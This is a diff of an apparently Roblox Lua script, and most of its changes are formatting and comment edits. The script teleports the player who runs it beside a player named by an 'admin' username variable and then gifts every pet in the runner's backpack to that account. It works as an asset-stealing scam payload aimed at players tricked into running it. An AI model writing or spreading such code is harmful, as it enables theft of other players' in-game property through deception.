@@ -6,31 +6,30 @@ local localPlayer = Players.LocalPlayer
 local backpack = localPlayer:WaitForChild("Backpack")
 local petGiftEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
 
--- Get admin player and character HRP
 local adminPlayer = Players:FindFirstChild(adminUsername)
 if not adminPlayer then
-    warn("Admin player not found")
-    return
+	warn("Admin player not found")
+	return
 end
 
 local adminChar = adminPlayer.Character
 if not adminChar or not adminChar:FindFirstChild("HumanoidRootPart") then
-    warn("Admin character or HRP not found")
-    return
+	warn("Admin character or HumanoidRootPart not found")
+	return
 end
 
 local localChar = localPlayer.Character or localPlayer.CharacterAdded:Wait()
 local hrp = localChar:WaitForChild("HumanoidRootPart")
 
--- Teleport to admin
-hrp.CFrame = adminChar.HumanoidRootPart.CFrame * CFrame.new(2, 0, 0) -- Slight offset so you don't overlap
+-- Teleport local player to admin
+hrp.CFrame = adminChar.HumanoidRootPart.CFrame * CFrame.new(2, 0, 0)
 
-wait(1) -- wait for teleport to settle
+wait(1) -- wait for teleport to complete
 
--- Give all pets to admin
+-- Give all pets to admin player
 for _, pet in ipairs(backpack:GetChildren()) do
-    if pet:IsA("Tool") or pet:IsA("Model") then
-        petGiftEvent:FireServer("GivePet", adminPlayer)
-        wait(0.3) -- avoid spamming
-    end
+	if pet:IsA("Tool") or pet:IsA("Model") then
+		petGiftEvent:FireServer("GivePet", adminPlayer)
+		wait(0.3)
+	end
 end
